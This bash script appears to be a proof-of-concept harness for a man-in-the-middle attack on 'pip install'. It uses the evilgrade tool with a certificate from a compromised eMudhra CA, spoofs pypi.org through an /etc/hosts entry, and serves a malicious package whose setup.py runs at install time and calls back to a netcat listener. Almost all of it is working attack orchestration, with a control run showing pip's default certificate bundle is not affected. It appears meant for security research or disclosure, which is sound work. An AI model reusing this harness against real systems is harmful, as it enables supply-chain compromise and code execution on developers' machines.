#!/bin/bash
###############################################################################
# run_pip.sh - pip install MITM via the compromised eMudhra CA, end to end,
#              driven by REAL evilgrade.
#
# What it proves: `pip install evilpkg` fetches a malicious sdist over TLS from
# evilgrade (presenting an eMudhra-signed pypi.org cert) and runs its setup.py
# at build time -> code execution as the user.
#
# A real MITM needs the victim's pypi.org to resolve to the attacker. pip has
# no --resolve, so this models the DNS spoof with an /etc/hosts entry
# (pypi.org -> 127.0.0.1). That edit needs sudo; it is reverted on exit by a
# trap. The evilgrade webserver binds a high port (no sudo needed), and pip is
# pointed at https://pypi.org:<port>/simple/.
#
# IMPORTANT: pip is exploitable only when it validates against the SYSTEM trust
# store. pip's DEFAULT vendored certifi bundle is NOT affected. We model the
# "system store" case with --cert /etc/ssl/cert.pem (equivalently PIP_CERT or a
# corp pip.conf). This is realistic: a corp eMudhra CA lives in that store.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

LPORT=4444                       # setup.py calls back here (hardcoded in the sdist)
pick_port PORT 9443 9543 12443 18443
HOSTS_LINE="127.0.0.1 pypi.org files.pythonhosted.org"

cleanup() {
    [ -n "${EG_PID:-}" ] && kill "$EG_PID" 2>/dev/null
    [ -n "${NCPID:-}" ]  && kill "$NCPID" 2>/dev/null
    # revert /etc/hosts
    if [ "${HOSTS_ADDED:-0}" = 1 ]; then
        sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null
        echo "[cleanup] reverted /etc/hosts"
    fi
    wait 2>/dev/null
}
trap cleanup EXIT INT TERM

rm -f /tmp/OWNED_BY_PIP /tmp/pip_cb.log
( nc -l "$LPORT" > /tmp/pip_cb.log 2>&1 ) & NCPID=$!

echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
if ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed; aborting"; exit 1; }
    HOSTS_ADDED=1
else
    echo "   (already present)"
fi

echo "== starting REAL evilgrade webserver (pypi_update, eMudhra cert) on :$PORT =="
start_evilgrade "$PORT" /tmp/eg_pip.log "pypi_update" || exit 1

echo
echo "== VICTIM: pip install over evilgrade (system trust store via --cert) =="
echo "   \$ /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \\"
echo "       --index-url https://pypi.org:$PORT/simple/ evilpkg"
echo "   ---- pip output ----"
timeout 90 /usr/bin/python3 -m pip install \
    --cert /etc/ssl/cert.pem \
    --no-build-isolation --no-cache-dir --disable-pip-version-check \
    --index-url "https://pypi.org:$PORT/simple/" evilpkg 2>&1 | tail -6 | sed 's/^/   /'
/usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_PIP (dropped by the sdist's setup.py) =="
[ -f /tmp/OWNED_BY_PIP ] && sed 's/^/   /' /tmp/OWNED_BY_PIP || echo "   <not created>"
echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
[ -s /tmp/pip_cb.log ] && sed 's/^/   /' /tmp/pip_cb.log || echo "   <none>"

echo
echo "== CONTROL: same install with pip's DEFAULT cert bundle (certifi) =="
printf "   default certifi: "
if timeout 30 /usr/bin/python3 -m pip install --no-build-isolation --no-cache-dir \
     --disable-pip-version-check --index-url "https://pypi.org:$PORT/simple/" evilpkg >/dev/null 2>&1; then
    echo "accepted (unexpected)"; /usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
else
    echo "REJECTED (TLS: eMudhra CA not in certifi) -- pip default is NOT vulnerable"
fi

echo; echo "== done =="
